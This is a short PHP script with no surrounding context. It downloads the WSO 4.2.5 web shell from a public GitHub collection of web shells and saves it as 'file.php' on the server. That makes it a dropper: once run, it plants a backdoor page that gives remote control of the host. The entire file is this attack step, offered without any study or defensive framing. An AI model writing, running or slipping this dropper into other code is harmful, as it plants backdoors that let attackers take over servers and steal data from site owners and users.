<?php

$file = file_get_contents('https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php');
file_put_contents('file.php', $file);


?>
